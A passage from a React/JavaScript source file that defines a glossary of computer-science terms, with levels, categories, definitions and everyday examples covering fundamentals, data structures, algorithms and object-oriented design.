import { useState, useMemo, useRef, useEffect } from "react";

const LEVELS = ["Foundational", "Intermediate", "Advanced", "Expert"];
const LEVEL_COLORS = {
  Foundational: { bg: "#0d3320", text: "#34d399", border: "#065f46" },
  Intermediate: { bg: "#1e1b4b", text: "#818cf8", border: "#3730a3" },
  Advanced: { bg: "#431407", text: "#fb923c", border: "#9a3412" },
  Expert: { bg: "#4a0519", text: "#fb7185", border: "#9f1239" },
};

const CATEGORIES = [
  "Fundamentals",
  "Data Structures",
  "Algorithms",
  "OOP & Design Patterns",
  "System Design & Architecture",
  "Databases & Storage",
  "Networking & Web",
  "Operating Systems",
  "DevOps & Infrastructure",
  "Software Engineering Process",
  "Programming Languages & Paradigms",
  "Security",
  "Testing & QA",
  "Frontend Engineering",
  "Backend Engineering",
  "Distributed Systems",
  "Cloud & Scalability",
  "AI / ML Foundations",
  "Math & Theory",
  "Career & Professional",
];

const CATEGORY_ICONS = {
  Fundamentals: "⚡",
  "Data Structures": "🏗️",
  Algorithms: "🧮",
  "OOP & Design Patterns": "🧩",
  "System Design & Architecture": "🏛️",
  "Databases & Storage": "🗄️",
  "Networking & Web": "🌐",
  "Operating Systems": "⚙️",
  "DevOps & Infrastructure": "🔧",
  "Software Engineering Process": "📋",
  "Programming Languages & Paradigms": "💻",
  Security: "🔒",
  "Testing & QA": "🧪",
  "Frontend Engineering": "🎨",
  "Backend Engineering": "🖥️",
  "Distributed Systems": "🌍",
  "Cloud & Scalability": "☁️",
  "AI / ML Foundations": "🤖",
  "Math & Theory": "📐",
  "Career & Professional": "🎯",
};

const dictionary = [
  // ═══════════════════════════════════════════
  // FUNDAMENTALS
  // ═══════════════════════════════════════════
  { term: "Variable", category: "Fundamentals", level: "Foundational", definition: "A named container that stores a value in memory. Like a labeled box — you put something in, and later refer to it by its label.", example: "age = 25 — 'age' is the variable holding the number 25. Change it anytime: age = 26." },
  { term: "Data Type", category: "Fundamentals", level: "Foundational", definition: "The classification of data that tells the computer what kind of value a variable holds and what operations are valid on it.", example: "Integer (42), Float (3.14), String (\"hello\"), Boolean (true/false). You can't divide a name by 2 — types prevent nonsensical operations." },
  { term: "Constant", category: "Fundamentals", level: "Foundational", definition: "A variable whose value cannot change once assigned. Used for values that should never be modified.", example: "PI = 3.14159 — the value of pi never changes, so it should be a constant." },
  { term: "Operator", category: "Fundamentals", level: "Foundational", definition: "A symbol that tells the computer to perform a specific mathematical, logical, or comparison operation.", example: "+ (add), - (subtract), == (equal?), != (not equal?), && (AND), || (OR)." },
  { term: "Expression", category: "Fundamentals", level: "Foundational", definition: "A combination of values, variables, and operators that evaluates to a single result.", example: "(price * quantity) + tax — this entire thing evaluates to one number, like a mini-calculator." },
  { term: "Statement", category: "Fundamentals", level: "Foundational", definition: "A complete instruction that the computer can execute. Unlike expressions, statements DO something rather than just compute a value.", example: "if (temperature > 100) { alert('Too hot!'); } — this is a statement that makes a decision and acts." },
  { term: "Control Flow", category: "Fundamentals", level: "Foundational", definition: "The order in which individual statements are executed. Branching (if/else) and looping (for/while) alter the default top-to-bottom flow.", example: "Like a choose-your-own-adventure book — depending on conditions, the program takes different paths." },
  { term: "Loop", category: "Fundamentals", level: "Foundational", definition: "A construct that repeats a block of code until a condition is met. Avoids writing the same code hundreds of times.", example: "Sending a 'Happy New Year' message to 500 contacts — a loop does it in 3 lines instead of 500." },
  { term: "Function / Method", category: "Fundamentals", level: "Foundational", definition: "A reusable block of code that performs a specific task. Takes inputs (parameters), does work, and optionally returns an output.", example: "calculateTax(price, rate) — give it a price and rate, it returns the tax amount. Write once, call anywhere." },
  { term: "Parameter vs Argument", category: "Fundamentals", level: "Foundational", definition: "A parameter is the placeholder name in a function definition. An argument is the actual value passed when calling the function.", example: "def greet(name): — 'name' is the parameter. greet('Alice') — 'Alice' is the argument." },
  { term: "Return Value", category: "Fundamentals", level: "Foundational", definition: "The output a function sends back to the code that called it. The function's 'answer'.", example: "sum(3, 5) returns 8. The calling code can then use that 8: total = sum(3, 5) + tax." },
  { term: "Scope", category: "Fundamentals", level: "Foundational", definition: "The region of code where a variable is accessible. Variables created inside a function can't be seen outside it (local scope).", example: "Like rooms in a house — a variable in the kitchen (function) isn't visible from the bedroom (another function)." },
  { term: "Syntax", category: "Fundamentals", level: "Foundational", definition: "The set of rules that defines how code must be written in a programming language. Like grammar in English.", example: "Python uses indentation; JavaScript uses curly braces {}. Wrong syntax = the program won't even run." },
  { term: "Semantics", category: "Fundamentals", level: "Foundational", definition: "The meaning of syntactically correct code. Syntax is grammar; semantics is what the sentence actually means.", example: "x = x + 1 is syntactically valid AND semantically clear (increment x). x = x / 0 is syntactically valid but semantically a disaster." },
  { term: "Compiler", category: "Fundamentals", level: "Foundational", definition: "A program that translates your entire source code into machine code BEFORE execution. The output is an executable file.", example: "C/C++ code is compiled into a .exe. Like translating an entire book into another language before anyone reads it." },
  { term: "Interpreter", category: "Fundamentals", level: "Foundational", definition: "A program that executes your source code line-by-line at runtime, without pre-compiling into machine code.", example: "Python is interpreted — each line runs immediately. Like a live translator at a conference, translating sentence by sentence." },
  { term: "IDE (Integrated Development Environment)", category: "Fundamentals", level: "Foundational", definition: "A software application that provides a comprehensive workspace for coding: editor, debugger, compiler, and tools all in one.", example: "VS Code, IntelliJ IDEA, PyCharm — like a carpenter's fully equipped workshop vs. just a hammer." },
  { term: "Bug", category: "Fundamentals", level: "Foundational", definition: "An error or flaw in code that causes it to produce incorrect or unexpected results.", example: "Your calculator app shows 2+2=5. That's a bug. Named after an actual moth found in a 1947 computer." },
  { term: "Debugging", category: "Fundamentals", level: "Foundational", definition: "The process of finding, analyzing, and fixing bugs. The detective work of programming.", example: "Using breakpoints to pause execution and inspect variable values step-by-step to find where things go wrong." },
  { term: "Pseudocode", category: "Fundamentals", level: "Foundational", definition: "An informal, human-readable description of an algorithm that uses plain language instead of programming syntax.", example: "IF user is logged in THEN show dashboard ELSE show login page — not real code, but captures the logic clearly." },
  { term: "Recursion", category: "Fundamentals", level: "Intermediate", definition: "A function that calls itself to solve a problem by breaking it into smaller identical sub-problems. Must have a base case to stop.", example: "Calculating factorial: 5! = 5 × 4! = 5 × 4 × 3! ... Like Russian nesting dolls — each one opens to reveal a smaller version." },
  { term: "Memory (RAM)", category: "Fundamentals", level: "Foundational", definition: "Temporary, fast storage that holds data and instructions the CPU is actively using. Lost when power is off.", example: "When you open Chrome, it loads into RAM for speed. That's why more tabs = more RAM used." },
  { term: "Bit / Byte", category: "Fundamentals", level: "Foundational", definition: "A bit is the smallest unit of data (0 or 1). A byte is 8 bits — enough to represent one character.", example: "The letter 'A' = 01000001 (1 byte). A kilobyte (KB) = 1024 bytes ≈ a short email." },
  { term: "ASCII / Unicode", category: "Fundamentals", level: "Foundational", definition: "Character encoding standards that map numbers to characters. ASCII covers English (128 chars); Unicode covers every language (150,000+ chars).", example: "ASCII: A=65, Z=90. Unicode lets you represent 你好, العربية, and emoji 🚀 in the same system." },
  { term: "Binary", category: "Fundamentals", level: "Foundational", definition: "The base-2 number system using only 0 and 1. Every piece of data in a computer is ultimately binary.", example: "Decimal 13 = Binary 1101. Computers use binary because transistors have two states: on (1) and off (0)." },
  { term: "Hexadecimal", category: "Fundamentals", level: "Foundational", definition: "Base-16 number system (0-9 and A-F). A compact way to represent binary — each hex digit = 4 bits.", example: "Color #FF5733 — FF=255 red, 57=87 green, 33=51 blue. Much easier to read than 111111110101011100110011." },
  { term: "Stack vs Heap", category: "Fundamentals", level: "Intermediate", definition: "Two regions of memory. Stack is fast, ordered, auto-managed (for function calls/local vars). Heap is larger, flexible, manually managed (for dynamic data).", example: "Stack = a stack of plates (last in, first out). Heap = a warehouse where you allocate/free shelves as needed." },
  { term: "Pointer / Reference", category: "Fundamentals", level: "Intermediate", definition: "A variable that stores a memory address instead of a direct value. It 'points to' where data lives in memory.", example: "Like writing down a friend's home address instead of carrying their house with you. Efficient but powerful (and dangerous)." },
  { term: "Garbage Collection", category: "Fundamentals", level: "Intermediate", definition: "Automatic memory management that finds and frees memory no longer in use by the program.", example: "Java/Python have GC. Like a janitor cleaning up abandoned desks in an office — you don't have to do it manually." },
  { term: "Type System (Static vs Dynamic)", category: "Fundamentals", level: "Intermediate", definition: "Static typing checks types at compile time (Java, C++). Dynamic typing checks at runtime (Python, JS). Tradeoff: safety vs. flexibility.", example: "Static: Java won't let you put a string where an int is expected — caught before running. Dynamic: Python lets you try, but may crash later." },
  { term: "Type Inference", category: "Fundamentals", level: "Intermediate", definition: "The compiler automatically deduces the type of a variable from its value, so you don't have to write it explicitly.", example: "In TypeScript: let x = 42 — compiler knows x is a number without you saying 'let x: number = 42'." },
  { term: "Strongly vs Weakly Typed", category: "Fundamentals", level: "Intermediate", definition: "Strongly typed languages don't allow implicit type conversions (Python: '5' + 3 = error). Weakly typed languages do (JavaScript: '5' + 3 = '53').", example: "JavaScript's '5' + 3 = '53' has caused countless production bugs. Python forces you to be explicit: int('5') + 3 = 8." },
  { term: "Immutability", category: "Fundamentals", level: "Intermediate", definition: "The property of data that cannot be changed after creation. Instead of modifying, you create a new copy with changes.", example: "Strings in Python/Java are immutable. 'hello'.upper() creates 'HELLO' — it doesn't change the original string." },
  { term: "Serialization / Deserialization", category: "Fundamentals", level: "Intermediate", definition: "Converting an in-memory object to a storable/transmittable format (serialization) and back (deserialization).", example: "Converting a User object to JSON to send over an API, then converting the JSON back to a User object on the receiving end." },
  { term: "Endianness", category: "Fundamentals", level: "Advanced", definition: "The order in which bytes of a multi-byte value are stored in memory. Big-endian: most significant byte first. Little-endian: least significant first.", example: "The number 0x12345678 stored as 12 34 56 78 (big-endian) vs 78 56 34 12 (little-endian). Matters in networking and cross-platform work." },

  // ═══════════════════════════════════════════
  // DATA STRUCTURES
  // ═══════════════════════════════════════════
  { term: "Array", category: "Data Structures", level: "Foundational", definition: "A fixed-size, ordered collection of elements stored in contiguous memory. Access any element instantly by its index (position).", example: "scores = [90, 85, 78, 92] — scores[0] is 90. Like a row of lockers numbered 0, 1, 2, 3." },
  { term: "Dynamic Array (ArrayList / Vector)", category: "Data Structures", level: "Foundational", definition: "An array that can grow or shrink automatically. When full, it creates a larger internal array and copies elements over.", example: "Python's list, Java's ArrayList. You keep appending items without worrying about size — it handles resizing internally." },
  { term: "Linked List", category: "Data Structures", level: "Foundational", definition: "A sequence of nodes where each node contains data and a pointer to the next node. Not stored contiguously in memory.", example: "Like a treasure hunt — each clue (node) tells you where the next clue is. Insertion/deletion is O(1) at known positions but search is O(n)." },
  { term: "Doubly Linked List", category: "Data Structures", level: "Foundational", definition: "A linked list where each node has pointers to both the next AND previous nodes. Enables backward traversal.", example: "Browser history — you can go forward and backward. Each page knows both the previous and next page." },
  { term: "Stack", category: "Data Structures", level: "Foundational", definition: "A Last-In-First-Out (LIFO) data structure. You can only add (push) or remove (pop) from the top.", example: "A stack of plates — you always take the top plate. Used for: undo operations, function call tracking, expression parsing." },
  { term: "Queue", category: "Data Structures", level: "Foundational", definition: "A First-In-First-Out (FIFO) data structure. Elements are added at the rear and removed from the front.", example: "A line at a coffee shop — first person in line gets served first. Used for: print jobs, task scheduling, BFS." },
  { term: "Deque (Double-Ended Queue)", category: "Data Structures", level: "Intermediate", definition: "A queue that allows insertion and removal at both the front and back in O(1) time.", example: "Like a line where people can join or leave from either end. Python's collections.deque. Used in sliding window problems." },
  { term: "Priority Queue", category: "Data Structures", level: "Intermediate", definition: "A queue where each element has a priority. The highest-priority element is dequeued first, regardless of insertion order.", example: "An emergency room — critical patients are treated before someone with a sprained ankle, even if the ankle arrived first." },
  { term: "Hash Table / Hash Map", category: "Data Structures", level: "Foundational", definition: "A data structure that maps keys to values using a hash function. Provides O(1) average-case lookup, insertion, and deletion.", example: "A phone book indexed by name. dict['Alice'] = '555-1234'. The hash function converts 'Alice' into an array index instantly." },
  { term: "Hash Function", category: "Data Structures", level: "Intermediate", definition: "A function that converts input of any size into a fixed-size value (hash). Good hash functions distribute values uniformly.", example: "hash('Alice') → 7, hash('Bob') → 3. Maps names to specific 'slots'. A bad hash function puts everyone in slot 7 (collision)." },
  { term: "Hash Collision", category: "Data Structures", level: "Intermediate", definition: "When two different keys produce the same hash value. Resolved via chaining (linked list at each slot) or open addressing (probing).", example: "hash('Alice')=7 and hash('Charlie')=7 — both want slot 7. Chaining: slot 7 holds a list [Alice, Charlie]. Probing: Charlie goes to slot 8." },
  { term: "Set", category: "Data Structures", level: "Foundational", definition: "An unordered collection of unique elements. Supports fast membership testing, union, intersection, and difference.", example: "Unique visitors to a website: {Alice, Bob, Charlie}. Adding Alice again has no effect — sets prevent duplicates." },
  { term: "Tree", category: "Data Structures", level: "Foundational", definition: "A hierarchical data structure with a root node and child nodes forming parent-child relationships. No cycles.", example: "Your computer's file system — folders contain subfolders which contain files. The C:\\ drive is the root." },
  { term: "Binary Tree", category: "Data Structures", level: "Foundational", definition: "A tree where each node has at most two children: left and right.", example: "Decision trees — at each node, you go left (yes) or right (no). Used in compression, expression parsing, and sorting." },
  { term: "Binary Search Tree (BST)", category: "Data Structures", level: "Intermediate", definition: "A binary tree where left child < parent < right child. Enables O(log n) search, insert, and delete when balanced.", example: "A dictionary organized so you always know whether to look left (earlier alphabet) or right (later alphabet)." },
  { term: "AVL Tree", category: "Data Structures", level: "Advanced", definition: "A self-balancing BST where the height difference between left and right subtrees is at most 1. Uses rotations to maintain balance.", example: "If inserting a new word makes the tree lopsided, AVL automatically rotates nodes to keep it balanced — guarantees O(log n) always." },
  { term: "Red-Black Tree", category: "Data Structures", level: "Advanced", definition: "A self-balancing BST with color properties (red/black) that ensure the tree stays approximately balanced. Less strict than AVL.", example: "Java's TreeMap and C++ std::map use Red-Black trees. Slightly less balanced than AVL but fewer rotations on insert/delete." },
  { term: "B-Tree / B+ Tree", category: "Data Structures", level: "Advanced", definition: "A self-balancing tree designed for disk-based storage. Each node can have many children, minimizing disk reads. B+ trees store all data in leaves.", example: "Database indexes use B+ trees. Instead of reading disk 20 times (binary tree depth), a B+ tree of order 100 needs only 3-4 reads for millions of rows." },
  { term: "Heap (Min-Heap / Max-Heap)", category: "Data Structures", level: "Intermediate", definition: "A complete binary tree where the parent is always smaller (min-heap) or larger (max-heap) than its children. Root is the extreme value.", example: "Min-heap: the smallest element is always at the top. Used in priority queues, Dijkstra's algorithm, and heap sort." },
  { term: "Trie (Prefix Tree)", category: "Data Structures", level: "Intermediate", definition: "A tree where each node represents a character, and paths from root to nodes form strings. Enables O(m) prefix-based search (m = key length).", example: "Autocomplete — typing 'app' instantly finds 'apple', 'application', 'appetizer' by walking the trie's branches." },
  { term: "Graph", category: "Data Structures", level: "Intermediate", definition: "A collection of vertices (nodes) connected by edges. Can be directed or undirected, weighted or unweighted, cyclic or acyclic.", example: "Social networks (people = nodes, friendships = edges), road maps (cities = nodes, roads = edges with distances as weights)." },
  { term: "Adjacency Matrix", category: "Data Structures", level: "Intermediate", definition: "A 2D array representation of a graph where matrix[i][j] = 1 (or weight) if there's an edge from vertex i to j.", example: "A 5-city map as a 5×5 grid. matrix[0][3] = 150 means it's 150km from city 0 to city 3. Fast lookup but wastes space for sparse graphs." },
  { term: "Adjacency List", category: "Data Structures", level: "Intermediate", definition: "A graph representation where each vertex stores a list of its neighbors. Space-efficient for sparse graphs.", example: "City A: [B, C], City B: [A, D]. Each city only lists its directly connected cities — no wasted space for non-existent roads." },
  { term: "Bloom Filter", category: "Data Structures", level: "Advanced", definition: "A probabilistic data structure that can tell you 'definitely not in set' or 'probably in set'. Uses multiple hash functions and a bit array. No false negatives.", example: "Email spam filter: quickly checks if a domain is 'probably spam'. May have false positives (legitimate domain flagged) but never misses actual spam domains." },
  { term: "Skip List", category: "Data Structures", level: "Advanced", definition: "A layered linked list with express lanes for faster search. Each upper layer skips more elements. Probabilistic alternative to balanced trees.", example: "Like a highway system — local roads (bottom), highways (middle), interstate (top). Jump to the right layer to skip ahead, then descend." },
  { term: "Disjoint Set / Union-Find", category: "Data Structures", level: "Advanced", definition: "A data structure that tracks elements partitioned into non-overlapping sets. Supports fast union (merge two sets) and find (which set contains element?).", example: "Social network groups — union(Alice, Bob) puts them in the same group. find(Alice) == find(Bob)? tells if they're connected." },
  { term: "Segment Tree", category: "Data Structures", level: "Advanced", definition: "A tree for efficient range queries (sum, min, max over a range) and point updates on an array. O(log n) for both.", example: "Given sales data for 365 days, quickly answer 'total sales from day 50 to day 200' without summing 150 values each time." },
  { term: "Fenwick Tree (Binary Indexed Tree)", category: "Data Structures", level: "Advanced", definition: "A compact tree structure for efficient prefix sum queries and point updates. Simpler than segment trees but limited to prefix operations.", example: "Running totals in a spreadsheet — update one cell and instantly recalculate all cumulative sums. O(log n) per operation." },
  { term: "LRU Cache", category: "Data Structures", level: "Intermediate", definition: "A fixed-size cache that evicts the Least Recently Used item when full. Combines a hash map (O(1) lookup) with a doubly linked list (O(1) reordering).", example: "Browser cache — stores recently visited pages. When memory fills up, it drops the page you haven't visited in the longest time." },

  // ═══════════════════════════════════════════
  // ALGORITHMS
  // ═══════════════════════════════════════════
  { term: "Algorithm", category: "Algorithms", level: "Foundational", definition: "A step-by-step procedure to solve a specific problem in a finite number of steps. Must be unambiguous, finite, and produce correct output.", example: "A recipe is an algorithm: Step 1: Boil water. Step 2: Add pasta. Step 3: Cook 10 min. Step 4: Drain. Clear, finite, deterministic." },
  { term: "Time Complexity (Big O)", category: "Algorithms", level: "Foundational", definition: "A mathematical notation describing how an algorithm's execution time grows as input size increases. Focuses on the dominant term.", example: "O(1) = instant. O(log n) = binary search. O(n) = scan a list. O(n²) = nested loops. O(2ⁿ) = brute-force subsets. Tells you if it'll scale." },
  { term: "Space Complexity", category: "Algorithms", level: "Foundational", definition: "The amount of memory an algorithm needs relative to input size. Includes input storage and auxiliary space.", example: "Merge sort needs O(n) extra space for temporary arrays. In-place quicksort needs only O(log n) for the call stack." },
  { term: "Big O / Big Ω / Big Θ", category: "Algorithms", level: "Intermediate", definition: "Big O = upper bound (worst case). Big Ω = lower bound (best case). Big Θ = tight bound (exact growth rate). Big O is most commonly used.", example: "Linear search: O(n) worst case, Ω(1) best case (found at first position), Θ(n) average case." },
  { term: "Bubble Sort", category: "Algorithms", level: "Foundational", definition: "Repeatedly swaps adjacent elements if they're in wrong order. O(n²). Simple but inefficient. Only useful for teaching.", example: "Like sorting cards by repeatedly comparing neighbors and swapping. After each pass, the largest unsorted element 'bubbles' to the end." },
  { term: "Selection Sort", category: "Algorithms", level: "Foundational", definition: "Repeatedly finds the minimum element from the unsorted portion and places it at the beginning. O(n²).", example: "Like lining up students by height — scan everyone, pick the shortest, place them first. Repeat for remaining students." },
  { term: "Insertion Sort", category: "Algorithms", level: "Foundational", definition: "Builds the sorted array one element at a time by inserting each element into its correct position. O(n²) worst, O(n) best (already sorted).", example: "Sorting playing cards in your hand — pick up a new card and slide it into the right position among cards you've already sorted." },
  { term: "Merge Sort", category: "Algorithms", level: "Intermediate", definition: "Divide-and-conquer: split array in half, recursively sort each half, then merge the two sorted halves. O(n log n) guaranteed.", example: "Sorting exam papers — split the pile, have two people sort each half, then merge by comparing top papers of each pile." },
  { term: "Quick Sort", category: "Algorithms", level: "Intermediate", definition: "Pick a 'pivot', partition elements into less-than and greater-than groups, recursively sort each group. O(n log n) average, O(n²) worst.", example: "Like organizing books — pick a random book, put shorter titles left and longer right. Repeat for each side. Fast in practice with good pivots." },
  { term: "Heap Sort", category: "Algorithms", level: "Intermediate", definition: "Build a max-heap from the array, then repeatedly extract the maximum to build the sorted result. O(n log n) guaranteed, in-place.", example: "Like a tournament bracket — the winner (max) is always at the top. Remove the winner, reorganize, new winner emerges. Repeat." },
  { term: "Counting Sort / Radix Sort", category: "Algorithms", level: "Intermediate", definition: "Non-comparison sorts. Counting sort counts occurrences of each value. Radix sort sorts digit by digit. O(n+k) or O(d·(n+k)). Beat O(n log n) for specific data.", example: "Sorting 1 million exam scores (0-100): count how many got each score, then output. 101 buckets, one pass. Way faster than quicksort here." },
  { term: "Binary Search", category: "Algorithms", level: "Foundational", definition: "Search a SORTED array by repeatedly halving the search space. Compare middle element, go left if smaller, right if larger. O(log n).", example: "Guessing a number 1-1000: 'Is it > 500?' 'Is it > 750?' — at most 10 guesses for 1000 numbers. Each guess eliminates half." },
  { term: "Linear Search", category: "Algorithms", level: "Foundational", definition: "Check every element one by one until you find the target or reach the end. O(n). Works on unsorted data.", example: "Looking for your keys by checking every pocket, drawer, and surface. Simple but slow for large collections." },
  { term: "Breadth-First Search (BFS)", category: "Algorithms", level: "Intermediate", definition: "Explore a graph level by level using a queue. Visit all neighbors of the current node before going deeper. Finds shortest path in unweighted graphs.", example: "Finding the shortest route on a subway map — explore all stations 1 stop away, then 2 stops, then 3. Guaranteed shortest path." },
  { term: "Depth-First Search (DFS)", category: "Algorithms", level: "Intermediate", definition: "Explore a graph by going as deep as possible along each branch before backtracking. Uses a stack (or recursion).", example: "Solving a maze — follow one path until you hit a dead end, then backtrack and try another path. Explores fully before broadening." },
  { term: "Dijkstra's Algorithm", category: "Algorithms", level: "Intermediate", definition: "Finds the shortest path from one node to all other nodes in a weighted graph with non-negative weights. Uses a priority queue. O((V+E) log V).", example: "GPS navigation — finding the fastest route from your location to the airport, considering road distances/times as edge weights." },
  { term: "A* Algorithm", category: "Algorithms", level: "Advanced", definition: "An extension of Dijkstra's that uses a heuristic function to guide search toward the goal. Faster than Dijkstra when a good heuristic exists.", example: "Video game pathfinding — characters find paths around obstacles efficiently by estimating distance to the goal (heuristic)." },
  { term: "Dynamic Programming (DP)", category: "Algorithms", level: "Intermediate", definition: "Solve complex problems by breaking them into overlapping sub-problems, solving each only once, and storing results. Avoids redundant computation.", example: "Fibonacci: fib(5) needs fib(4) and fib(3). fib(4) also needs fib(3). Without DP, you compute fib(3) twice. With DP, compute once, reuse." },
  { term: "Memoization", category: "Algorithms", level: "Intermediate", definition: "Top-down DP technique: cache the results of expensive function calls and return the cached result when the same inputs occur again.", example: "A math tutor who writes solved problems on a whiteboard. When a student asks the same question, they point to the board instead of re-solving." },
  { term: "Tabulation", category: "Algorithms", level: "Intermediate", definition: "Bottom-up DP technique: iteratively fill a table from the smallest sub-problems up to the final answer. No recursion needed.", example: "Building a multiplication table row by row — start from 1×1, work your way up. Each cell uses already-computed cells." },
  { term: "Greedy Algorithm", category: "Algorithms", level: "Intermediate", definition: "Makes the locally optimal choice at each step, hoping to find the global optimum. Doesn't always work but is fast when applicable.", example: "Making change with the fewest coins: always pick the largest coin that fits. $0.67 → 2 quarters + 1 dime + 1 nickel + 2 pennies. Works for US coins but not all coin systems." },
  { term: "Backtracking", category: "Algorithms", level: "Intermediate", definition: "Build a solution incrementally, abandoning a path as soon as it violates constraints (prune). Explores all valid possibilities systematically.", example: "Solving Sudoku — fill in numbers, and when you hit a contradiction, erase the last number and try the next option." },
  { term: "Divide and Conquer", category: "Algorithms", level: "Intermediate", definition: "Break a problem into smaller independent sub-problems, solve each recursively, combine results. Key: sub-problems don't overlap (unlike DP).", example: "Merge sort: split array → sort halves → merge. Each half is independent. Also: binary search, quicksort, Karatsuba multiplication." },
  { term: "Two Pointers Technique", category: "Algorithms", level: "Intermediate", definition: "Use two pointers (indices) to traverse data from different positions or speeds. Solves many array/string problems in O(n) instead of O(n²).", example: "Finding a pair that sums to a target in a sorted array: one pointer at start, one at end. Move inward based on current sum." },
  { term: "Sliding Window", category: "Algorithms", level: "Intermediate", definition: "Maintain a 'window' of elements and slide it across data to compute something efficiently. Avoids recomputing the entire window each step.", example: "Max sum of any 5 consecutive days of sales: instead of summing 5 elements each time, subtract the element leaving the window and add the new one entering." },
  { term: "Topological Sort", category: "Algorithms", level: "Advanced", definition: "Linear ordering of vertices in a DAG (Directed Acyclic Graph) such that for every edge u→v, u comes before v. Used for dependency resolution.", example: "University course prerequisites: must take Calc I before Calc II before Calc III. Topological sort gives a valid course order." },
  { term: "Kruskal's / Prim's Algorithm", category: "Algorithms", level: "Advanced", definition: "Find the Minimum Spanning Tree (MST) — connecting all nodes with minimum total edge weight. Kruskal's sorts edges; Prim's grows from a start node.", example: "Laying fiber optic cable to connect 50 buildings with minimum total cable length. MST gives the cheapest network topology." },
  { term: "Floyd-Warshall Algorithm", category: "Algorithms", level: "Advanced", definition: "Finds shortest paths between ALL pairs of vertices. O(V³). Works with negative weights (no negative cycles).", example: "A shipping company needs the shortest route between every pair of 100 warehouses — Floyd-Warshall computes all 10,000 pairs." },
  { term: "Bellman-Ford Algorithm", category: "Algorithms", level: "Advanced", definition: "Finds shortest path from one source, works with negative edge weights. Detects negative cycles. O(V·E).", example: "Currency arbitrage detection — model exchange rates as edges. Negative cycle = you can make infinite money by cycling currencies." },
  { term: "NP-Completeness", category: "Algorithms", level: "Advanced", definition: "A class of problems where no known polynomial-time algorithm exists, but a solution can be VERIFIED in polynomial time. If you solve one, you solve them all.", example: "Traveling Salesman: given 50 cities, find the shortest route visiting all. Checking a given route is easy, but finding the best is astronomically hard." },
  { term: "Amortized Analysis", category: "Algorithms", level: "Advanced", definition: "Analyzing the average time per operation over a sequence of operations, even if individual operations are occasionally expensive.", example: "Dynamic array append is O(1) amortized — most appends are O(1), but occasionally it doubles the array (O(n)). Over n operations, total is O(n), so each is O(1) average." },
  { term: "Heuristic", category: "Algorithms", level: "Intermediate", definition: "A practical approach to problem-solving that uses shortcuts to find a 'good enough' solution when an optimal solution is impractical.", example: "In chess AI, evaluating every possible move is impossible. Heuristics (material count, king safety) estimate board quality without full analysis." },

  // ═══════════════════════════════════════════
  // OOP & DESIGN PATTERNS
  // ═══════════════════════════════════════════
  { term: "Object-Oriented Programming (OOP)", category: "OOP & Design Patterns", level: "Foundational", definition: "A programming paradigm that organizes code around 'objects' — bundles of data (attributes) and behavior (methods) that model real-world entities.", example: "A Car object has attributes (color, speed, fuel) and methods (accelerate, brake, refuel). You think in terms of things, not procedures." },
  { term: "Class", category: "OOP & Design Patterns", level: "Foundational", definition: "A blueprint or template for creating objects. Defines what attributes and methods all objects of that type will have.", example: "class Dog { name, breed, bark() } — the blueprint. myDog = new Dog('Rex', 'Labrador') — an actual dog created from the blueprint." },
  { term: "Object / Instance", category: "OOP & Design Patterns", level: "Foundational", definition: "A concrete entity created from a class. Each instance has its own copy of the class's attributes with specific values.", example: "Dog class → dog1 = Dog('Rex'), dog2 = Dog('Buddy'). Same blueprint, different instances with different names." },
  { term: "Encapsulation", category: "OOP & Design Patterns", level: "Foundational", definition: "Bundling data and methods together AND hiding internal details. External code interacts through a public interface, not internal implementation.", example: "You drive a car using the steering wheel and pedals (public interface) without knowing how the engine works internally (hidden implementation)." },
  { term: "Inheritance", category: "OOP & Design Patterns", level: "Foundational", definition: "A mechanism where a new class (child) inherits attributes and methods from an existing class (parent). Enables code reuse and hierarchy.", example: "class Animal { eat() } → class Dog extends Animal { bark() }. Dog inherits eat() and adds bark(). You don't rewrite eat() for every animal." },
  { term: "Polymorphism", category: "OOP & Design Patterns", level: "Foundational", definition: "The ability of different objects to respond to the same method call in their own way. 'Many forms' of the same operation.", example: "shape.draw() — a Circle draws a circle, a Square draws a square. Same method name, different behavior based on the object's type." },
  { term: "Abstraction", category: "OOP & Design Patterns", level: "Foundational", definition: "Hiding complex implementation details and showing only the essential features. Focus on WHAT something does, not HOW.", example: "You call array.sort() without knowing which sorting algorithm is used. The complexity is abstracted away — you just get a sorted array." },
  { term: "Interface", category: "OOP & Design Patterns", level: "Intermediate", definition: "A contract that defines what methods a class must implement, without specifying how. Enables coding to a contract rather than a specific class.", example: "interface Payable { calculatePay() }. Both Employee and Contractor implement it differently, but payroll code treats them the same way." },
  { term: "Abstract Class", category: "OOP & Design Patterns", level: "Intermediate", definition: "A class that can't be instantiated directly. May have abstract methods (no implementation) that subclasses must implement, plus concrete methods they inherit.", example: "abstract class Shape { abstract area(); perimeter() {...} }. You can't create 'a shape' — you create a Circle or Rectangle that IS a shape." },
  { term: "Composition over Inheritance", category: "OOP & Design Patterns", level: "Intermediate", definition: "Design principle: build complex objects by combining simpler ones (has-a) rather than inheriting (is-a). More flexible, avoids deep hierarchies.", example: "Instead of ElectricFlyingCar extending Car, use: Car has-a Engine, has-a FlyingModule. Swap components without rewriting class hierarchies." },
  { term: "SOLID Principles", category: "OOP & Design Patterns", level: "Intermediate", definition: "Five design principles for clean, maintainable OOP code: Single Responsibility, Open/Closed, Liskov Substitution, Interface Segregation, Dependency Inversion.", example: "S: A class does one thing. O: Extend behavior without modifying existing code. L: Subtypes are substitutable for their base types. I: Many specific interfaces > one fat interface. D: Depend on abstractions, not concretions." },
  { term: "Single Responsibility Principle (SRP)", category: "OOP & Design Patterns", level: "Intermediate", definition: "A class should have only one reason to change — it should do one thing and do it well.", example: "Don't make a UserService handle authentication AND email sending AND database queries. Split into AuthService, EmailService, UserRepository." },
  { term: "Open/Closed Principle (OCP)", category: "OOP & Design Patterns", level: "Intermediate", definition: "Software entities should be open for extension but closed for modification. Add new features by writing new code, not changing existing code.", example: "Adding a new payment method shouldn't require modifying the PaymentProcessor. Instead, create a new class implementing the PaymentMethod interface." },
  { term: "Dependency Injection (DI)", category: "OOP & Design Patterns", level: "Intermediate", definition: "Instead of a class creating its own dependencies, they are 'injected' from outside. Makes code testable and loosely coupled.", example: "UserService doesn't create its own DatabaseConnection — it receives one in its constructor. For testing, inject a mock database instead of a real one." },
  { term: "Design Pattern", category: "OOP & Design Patterns", level: "Intermediate", definition: "A reusable, named solution to a commonly occurring problem in software design. Not code, but a template for solving a category of problems.", example: "The Gang of Four (GoF) cataloged 23 patterns: Singleton, Factory, Observer, Strategy, etc. — like architectural blueprints for software." },
